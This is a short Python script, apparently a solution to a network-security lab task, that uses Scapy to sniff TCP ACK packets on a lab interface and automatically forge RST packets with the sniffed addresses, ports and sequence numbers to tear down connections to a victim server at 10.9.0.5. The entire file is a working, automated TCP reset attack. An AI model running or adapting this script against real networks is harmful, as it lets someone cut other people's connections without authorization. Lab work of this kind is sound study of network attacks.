"""
    Write a program to launch the attack automatically using the sniffing-and-spoofing technique.
    Get all the parameters from sniffed packets, so the entire attack is automated.
    Please make sure that when you use Scapy's sniff() function, don't forget to set the 'iface' argument.
"""

victim_ip = '10.9.0.5'
atk_mac = '02:42:e5:d7:f0:d9'

from scapy.all import *

# RST TCP = 0x04
# ACK TCP = 0x10

def RST_Atk(pkt):
    # Receive the [ACK] TCP packet from Client and automatically send [RST] TCP packet to Victim Server
    if pkt[IP].src != victim_ip and pkt[TCP].flags == 0x10:
        ip = IP(src = pkt[IP].src, dst = pkt[IP].dst)
        tcp = TCP(sport = pkt[TCP].sport, dport = pkt[TCP].dport, flags = 0x04, seq = pkt[TCP].seq)
        new_pkt = ip/tcp
        new_pkt.show()
        send(new_pkt)


interface = 'br-d6b258aef2ee'
fil = 'tcp'
pkt = sniff(iface=interface, filter=fil, prn=RST_Atk)